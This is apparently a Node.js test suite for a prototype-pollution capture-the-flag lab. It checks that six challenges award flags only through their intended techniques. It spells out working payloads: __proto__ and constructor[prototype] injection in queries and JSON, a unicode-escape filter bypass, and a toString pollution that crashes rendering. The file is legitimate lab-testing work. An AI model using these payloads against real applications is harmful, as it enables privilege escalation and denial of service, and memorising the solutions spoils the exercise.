'use strict';
// Prototype Pollution module: every challenge must be solvable by the
// documented technique and must NOT be solvable by the obvious shortcut.
// Pollution is process-wide once it lands, so each subtest boots a fresh
// server; otherwise an earlier exploit would make later "denied" assertions
// pass for free.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// Minimal cookie-jar client for raw text/plain bodies (the shared helper
// client only speaks form and JSON posts).
function textClient(base) {
  let cookie = '';
  async function req(method, url, { text, headers } = {}) {
    const res = await fetch(base + url, {
      method,
      redirect: 'manual',
      headers: {
        ...(cookie ? { cookie } : {}),
        'content-type': 'text/plain',
        ...headers,
      },
      body: text,
    });
    const set = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    for (const c of set) {
      const pair = c.split(';')[0];
      const name = pair.split('=')[0];
      cookie = cookie.split('; ').filter((p) => p && !p.startsWith(name + '=')).concat(pair).join('; ');
    }
    const body = await res.text();
    return { status: res.status, text: body, headers: res.headers };
  }
  return {
    get: (url, headers) => req('GET', url, { headers }),
    postText: (url, text) => req('POST', url, { text }),
  };
}

test('proto module', async (t) => {
  await t.test('module page renders, links resolve, no em dash, no flag leak', async () => {
    const { srv } = await bootLab(t);
    const c = client(srv.base);
    const { status, text } = await c.get('/proto');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 6);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of ['/proto/query', '/proto/json', '/proto/constructor', '/proto/dos', '/proto/client', '/proto/unicode']) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('proto-query: flat role param gives nothing, __proto__[role] earns the flag', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-query');
    const denied = await c.get('/proto/query/admin');
    assert.ok(!denied.text.includes(flag), 'admin check must deny before any pollution');
    await c.get('/proto/query?role=admin');
    const stillDenied = await c.get('/proto/query/admin');
    assert.ok(!stillDenied.text.includes(flag), 'a flat role param must not pollute the prototype');
    await c.get('/proto/query?__proto__[role]=admin');
    const hit = await c.get('/proto/query/admin');
    assert.ok(hit.text.includes(flag), 'query-string pollution must award the flag');
    assert.ok((await capturedSet(c)).includes('proto:Query-String Pollution'));
  });

  await t.test('proto-json: flat body gives nothing, JSON __proto__ body earns the flag', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-json');
    const denied = await c.get('/proto/json/admin');
    assert.ok(!denied.text.includes(flag), 'admin check must deny before any pollution');
    await c.postJson('/proto/json/merge', { role: 'admin' });
    const stillDenied = await c.get('/proto/json/admin');
    assert.ok(!stillDenied.text.includes(flag), 'a flat JSON body must not pollute the prototype');
    const merged = await c.postJson('/proto/json/merge', JSON.parse('{"__proto__": {"role": "admin"}}'));
    assert.equal(merged.status, 200);
    const hit = await c.get('/proto/json/admin');
    assert.ok(hit.text.includes(flag), 'JSON body pollution must award the flag');
    assert.ok((await capturedSet(c)).includes('proto:JSON Body Pollution'));
  });

  await t.test('proto-constructor: literal __proto__ is dropped, constructor[prototype] earns the flag', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-constructor');
    const denied = await c.get('/proto/constructor/admin');
    assert.ok(!denied.text.includes(flag), 'admin check must deny before any pollution');
    await c.get('/proto/constructor?__proto__[role]=admin');
    const stillDenied = await c.get('/proto/constructor/admin');
    assert.ok(!stillDenied.text.includes(flag), 'the blacklisted key must be dropped, no award');
    await c.get('/proto/constructor?constructor[prototype][role]=admin');
    const hit = await c.get('/proto/constructor/admin');
    assert.ok(hit.text.includes(flag), 'constructor.prototype bypass must award the flag');
    assert.ok((await capturedSet(c)).includes('proto:Blacklist Bypass via constructor'));
  });

  await t.test('proto-dos: fresh widget renders fine, polluting toString crashes it for the flag', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-dos');
    const fresh = await c.get('/proto/dos');
    assert.equal(fresh.status, 200);
    assert.ok(!fresh.text.includes(flag), 'a fresh widget must not award');
    const hit = await c.get('/proto/dos?__proto__[toString]=boom');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes('The widget broke'), 'the render must crash');
    assert.ok(hit.text.includes(flag), 'the crash page must award the flag');
    assert.ok((await capturedSet(c)).includes('proto:Polluting toString'));
  });

  await t.test('proto-client: a claim with no page load earns nothing; the issued render token is required', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-client');
    // The old cheat: a bare claim with no page load and no pollution at all.
    const bare = await c.get('/proto/client/claim?theme=dark');
    assert.equal(bare.status, 400);
    assert.ok(!bare.text.includes(flag), 'claim with no page load must not award');
    const noTheme = await c.get('/proto/client/claim');
    assert.equal(noTheme.status, 400);
    assert.ok(!noTheme.text.includes(flag), 'claim with no theme must not award');
    const light = await c.get('/proto/client/claim?theme=light');
    assert.equal(light.status, 400);
    assert.ok(!light.text.includes(flag), 'claim with the default theme must not award');
    // Load the page the way a browser would: it issues a one-time render token.
    const page = await c.get('/proto/client?__proto__[theme]=dark');
    assert.equal(page.status, 200);
    const m = page.text.match(/RENDER_PROOF = "([0-9a-f]{32})"/);
    assert.ok(m, 'the page must carry its issued render token');
    const proof = m[1];
    // A forged token with a polluted theme still earns nothing.
    const forged = await c.get('/proto/client/claim?theme=dark&proof=deadbeefdeadbeefdeadbeefdeadbeef');
    assert.equal(forged.status, 400);
    assert.ok(!forged.text.includes(flag), 'a forged render token must not award');
    // The honest claim: the page's own script echoes its token back.
    const hit = await c.get(`/proto/client/claim?theme=dark&proof=${proof}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flag), 'the render-token claim must award the flag');
    assert.ok((await capturedSet(c)).includes('proto:Client-Side Pollution'));
    // The token is one-time: replaying it earns nothing new.
    const replay = await c.get(`/proto/client/claim?theme=dark&proof=${proof}`);
    assert.equal(replay.status, 400);
    assert.ok(!replay.text.includes(flag), 'the render token cannot be replayed');
  });

  await t.test('proto-unicode-bypass: raw __proto__ is blocked, \\u005f escapes slip past and earn the flag', async () => {
    const { srv, dataDir } = await bootLab(t);
    const tc = textClient(srv.base);
    const flag = flagFromDb(dataDir, 'proto', 'proto-unicode-bypass');
    const denied = await tc.get('/proto/unicode/admin');
    assert.ok(!denied.text.includes(flag), 'admin check must deny before any pollution');
    const blocked = await tc.postText('/proto/unicode/merge', '{"__proto__": {"role": "admin"}}');
    assert.equal(blocked.status, 400);
    const stillDenied = await tc.get('/proto/unicode/admin');
    assert.ok(!stillDenied.text.includes(flag), 'raw __proto__ in the body must be blocked');
    const benign = await tc.postText('/proto/unicode/merge', '{"appName": "demo"}');
    assert.equal(benign.status, 200);
    const stillDenied2 = await tc.get('/proto/unicode/admin');
    assert.ok(!stillDenied2.text.includes(flag), 'a benign body must not award');
    const exploit = await tc.postText('/proto/unicode/merge', '{"\\u005f\\u005fproto\\u005f\\u005f": {"role": "admin"}}');
    assert.equal(exploit.status, 200);
    const hit = await tc.get('/proto/unicode/admin');
    assert.ok(hit.text.includes(flag), 'unicode escape bypass must award the flag');
    assert.ok((await capturedSet(tc)).includes('proto:Unicode Escape Bypass'));
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const { srv, dataDir } = await bootLab(t);
    const c = client(srv.base);
    const tc = textClient(srv.base);
    const flag = (id) => flagFromDb(dataDir, 'proto', id);

    await c.get('/proto/query?__proto__[role]=admin');
    assert.ok((await c.get('/proto/query/admin')).text.includes(flag('proto-query')));

    await c.postJson('/proto/json/merge', JSON.parse('{"__proto__": {"role": "admin"}}'));
    assert.ok((await c.get('/proto/json/admin')).text.includes(flag('proto-json')));

    await c.get('/proto/constructor?constructor[prototype][role]=admin');
    assert.ok((await c.get('/proto/constructor/admin')).text.includes(flag('proto-constructor')));

    assert.ok((await c.get('/proto/dos?__proto__[toString]=boom')).text.includes(flag('proto-dos')));

    // proto-client: the claim must carry the one-time token issued at page load.
    const protoPage = await c.get('/proto/client');
    const proof = protoPage.text.match(/RENDER_PROOF = "([0-9a-f]{32})"/)[1];
    assert.ok((await c.get(`/proto/client/claim?theme=dark&proof=${proof}`)).text.includes(flag('proto-client')));

    const uni = await tc.postText('/proto/unicode/merge', '{"\\u005f\\u005fproto\\u005f\\u005f": {"role": "admin"}}');
    assert.equal(uni.status, 200);
    assert.ok((await c.get('/proto/unicode/admin')).text.includes(flag('proto-unicode-bypass')));

    const got = (await capturedSet(c)).filter((s) => s.startsWith('proto:'));
    assert.equal(got.length, 6);
    assert.equal(new Set(got).size, 6);
    for (const name of ['Query-String Pollution', 'JSON Body Pollution', 'Blacklist Bypass via constructor', 'Polluting toString', 'Client-Side Pollution', 'Unicode Escape Bypass']) {
      assert.ok(got.includes(`proto:${name}`), `missing ${name}`);
    }
  });
});
